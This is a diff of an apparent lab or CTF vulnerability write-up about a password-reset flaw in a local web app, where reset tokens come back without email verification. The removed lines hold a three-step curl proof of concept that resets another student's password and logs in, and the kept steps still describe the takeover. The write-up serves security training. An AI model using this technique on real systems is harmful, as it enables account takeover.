@@ -9,50 +9,21 @@
 
 ## Location
 
-http://localhost:4942/reset-password
+`http://localhost:4942/reset-password`
 
 ## Discovery
 
 In the Benjamin's post on Forum, he gave a hint about resetting passwords.
-http://localhost:4942/forum/r8y1ib6ub8g47u2
-"Locked myself out last night and used the password reset. The link worked instantly — no email, "
+`http://localhost:4942/forum/r8y1ib6ub8g47u2`
+`"Locked myself out last night and used the password reset. The link worked instantly — no email, "`
+
 ## Steps to Reproduce
 
 1. Go to http://localhost:4942/reset-password
 2. give one the student email (benjamin@student.42.tech for example)
 3. enter a new password, validate and login with this email and new password
 
-Alternatively, run `./exploit.sh` or execute the following commands in a terminal:
-
-Request 1 — Request a password reset and retrieve the token from the `Location` header:
-curl -i -sS \
-  -X POST 'http://localhost:4942/reset-password/request' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  --data-urlencode 'email=dorian@student.42.tech'
-
-Request 2 — Confirm the new password with the received token.
-Replace `<RECEIVED_TOKEN>` with the value of the `token=` parameter from the `Location` header in request 1:
-curl -i -sS \
-  -X POST 'http://localhost:4942/reset-password/confirm' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  --data-urlencode 'email=dorian@student.42.tech' \
-  --data-urlencode 'token=<RECEIVED_TOKEN>' \
-  --data-urlencode 'new_password=TestPass1234'
-
-Request 3 — Log in with the user's email and new password:
-curl -i -sS -c cookies.txt \
-  -X POST 'http://localhost:4942/login' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  --data-urlencode 'identity=dorian@student.42.tech' \
-  --data-urlencode 'password=TestPass1234'
-
-
-
-## Security Assessment
-
-The password recovery process must verify that the requester controls the registered email address before authorizing a password change.
-
-Direct access to the password reset form is not a vulnerability by itself. The vulnerability is confirmed if the application authorizes the password change without independent verification of email ownership.
+Alternatively, run `./exploit.sh`.
 
 ## Impact
 
